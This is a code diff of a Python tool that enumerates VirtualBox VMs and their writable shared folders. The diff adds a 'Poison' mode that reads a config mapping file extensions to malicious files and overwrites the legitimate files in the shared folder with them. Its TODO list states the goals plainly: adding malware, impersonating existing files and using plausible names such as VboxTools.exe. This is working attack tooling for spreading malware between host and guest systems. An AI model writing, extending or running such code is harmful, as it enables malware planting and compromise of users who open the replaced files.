@@ -3,6 +3,7 @@ import argparse
 import shutil
 import os 
 import sys
+import configparser
 
 def findVMs():
     vbox = virtualbox.VirtualBox()
@@ -21,7 +22,6 @@ def checkCanWrite(shares: dict):
             sharedFolder = value
 
 
-    #print(f"[+] {sharedFolder} | writable: {writable}")
     return writable, sharedFolder
 
 
@@ -36,15 +36,17 @@ def enumeratePath(sharedFilePath: str):
     return result
 
 """
-Currently will only enumerate shared folders
+Supports 2 modes:
+    - Poison
+    - Enum
 
 Todo
 - [ x ] Test if it'll enumerate multiple shared folders
-- [ ] Add in functionality that'll add malware to the shared folder
+- [ x ] Add in functionality that'll add malware to the shared folder
 - [ ] Add in functionality that if there's no shared folder, it'll create one
 - [ ] Maybe auto-mount the shared folder if it's not already mounted?
 - [ x ] Turn shared folder finder into a separate function
-- [ ] Add in enumeration mode to enumerate files existing within shared folders
+- [ x ] Add in enumeration mode to enumerate files existing within shared folders
 - [ x ] Maybe for posioning feature, add in a way to remove & replace existing files within the shared folder to impersonate them?
     - [ ] & if no files currently exist within the shared folder, create one that has a legitimate name (EX: VboxTools.exe)
     - [ ] Add in method to differentiate between VM types & copy files respective to the OS type of a VM (EX: If it's a Windows VM, copy .exe files or doc files. If linux, copy .sh, etc)
@@ -98,9 +100,16 @@ if __name__ == '__main__':
                     print(f"[!] Poison file config not set! Must be specified to proceed with file replacement...")
                     sys.exit()
                 else:
+                    # Parse config file to find malicious files to replace legit files with
+                    config = configparser.ConfigParser()
+                    config.read(args.file)
                     # Grab filenames of items in shared folder to replace them with malicious ones
                     filenames = enumeratePath(path)
                     for filename in filenames:
-                        print(f"[+] Replacing {filename}...")
-                        shutil.copy2(args.file, filename)
-
+                        # Reference config file to find filetypes & respective malicious ones to replace legitimate ones with
+                        # If a filetype & its malicious location isn't referenced within the config file, it's ignored & not replaced
+                        for filetype, value in config["filetype locations"].items():
+                            if filename.split(".")[-1] == filetype:
+                                print(f"[+] Replacing {filename} with {value}...")
+                                shutil.copy2(value, filename)
+                    
